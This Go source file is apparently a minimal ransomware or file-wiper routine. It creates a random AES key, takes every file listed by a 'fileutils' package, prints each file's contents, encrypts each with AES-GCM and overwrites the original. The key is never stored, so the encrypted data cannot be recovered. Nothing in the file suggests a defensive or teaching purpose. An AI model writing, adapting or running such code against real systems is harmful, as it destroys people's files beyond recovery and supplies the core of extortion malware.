package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fileutils"
	"fmt"
	"io"
	"io/ioutil"
)

func main() {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	for _, file := range fileutils.GetAllFiles() {
		plaintext, err := ioutil.ReadFile(file)
		if err != nil {
			panic(err.Error())
		}

		fmt.Println("plaintext: ", string(plaintext))

		block, err := aes.NewCipher(bytes)
		if err != nil {
			panic(err.Error())
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			panic(err.Error())
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
			panic(err.Error())
		}

		ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

		fmt.Println("crypted hex: ", hex.EncodeToString(ciphertext))

		err2 := ioutil.WriteFile(file, ciphertext, 0644)

		if err2 != nil {
			panic(err.Error())
		}
	}

}
